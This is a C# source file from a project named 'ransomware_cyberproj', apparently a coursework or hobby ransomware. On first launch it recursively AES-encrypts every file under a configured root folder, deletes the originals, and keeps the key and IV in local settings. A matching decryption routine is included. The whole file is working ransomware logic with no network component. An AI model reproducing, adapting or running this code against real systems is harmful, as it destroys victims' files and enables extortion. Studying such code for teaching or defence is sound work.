using Newtonsoft.Json;
using System.IO;
using System.Text;

namespace ransomware_cyberproj
{
    internal static class Program
    {
        // The ROOT !
        static string root = "C:\\Users\\your\\local\\path";

        // Encrypts files in a folder recursively.
        private static void encryptFolder(string Path, AesCrypter aes)
        {
            foreach (string file in Directory.GetFiles(Path))
            {
                try
                {
                    FileStream data = File.Open(file, FileMode.Open);
                    Stream encrypted = aes.Encrypt(data);
                    Stream saveEncrypted = File.Open(file + ".enc", FileMode.OpenOrCreate);
                    encrypted.CopyTo(saveEncrypted);
                    encrypted.Close();
                    saveEncrypted.Close();
                    data.Close();
                    File.Delete(file); // Delete the original unencrypted file.
                }
                catch
                {
                    // Handle any exceptions that might occur during encryption.
                }
            }
            foreach (string dir in Directory.GetDirectories(Path))
            {
                encryptFolder(dir, aes); // Recursively encrypt subdirectories.
            }
        }

        // Decrypts files in a folder recursively.
        private static void decryptFolder(string Path, AesCrypter aes)
        {
            foreach (string file in Directory.GetFiles(Path))
            {
                try
                {
                    if (!file.EndsWith(".enc")) continue; // Skip files that are not encrypted !
                    FileStream data = File.Open(file, FileMode.Open);
                    Stream decrypted = aes.Decrypt(data);
                    Stream savedecrypted = File.Open(file.Substring(0, file.Length - 4), FileMode.OpenOrCreate);
                    decrypted.CopyTo(savedecrypted);
                    decrypted.Close();
                    savedecrypted.Close();
                    data.Close();
                    File.Delete(file); // Delete the encrypted file after decryption.
                }
                catch
                {
                    // Handle any exceptions that might occur during decryption.
                }
            }
            foreach (string dir in Directory.GetDirectories(Path))
            {
                decryptFolder(dir, aes); // Recursively decrypt subdirectories.
            }
        }

        // Run encryption process.
        public static void runEncryption()
        {
            Tuple<byte[], byte[]> t = AesCrypter.GenerateNewKeyAndIV();
            Properties.Settings.Default.key = Convert.ToBase64String(t.Item1);
            Properties.Settings.Default.iv = Convert.ToBase64String(t.Item2);

            // Encrypt files in the specified root folder using the generated key and IV.
            encryptFolder(root, new AesCrypter(Tuple.Create<byte[], byte[]>(Convert.FromBase64String(Properties.Settings.Default.key), Convert.FromBase64String(Properties.Settings.Default.iv))));

            Properties.Settings.Default.hasRanEncryption = true;
            Properties.Settings.Default.Save();
        }

        // Run decryption process.
        public static void runDecryption()
        {
            // Decrypt files in the specified root folder using the stored key and IV.
            decryptFolder(root, new AesCrypter(Tuple.Create<byte[], byte[]>(Convert.FromBase64String(Properties.Settings.Default.key), Convert.FromBase64String(Properties.Settings.Default.iv))));

            Properties.Settings.Default.hasRanEncryption = false;
            Properties.Settings.Default.Save();
        }

        [STAThread]
        static void Main()
        {
            ApplicationConfiguration.Initialize();

            // If encryption hasn't run before, run the encryption process.
            if (!Properties.Settings.Default.hasRanEncryption)
                runEncryption();

            Application.Run(new Form1());
        }
    }
}
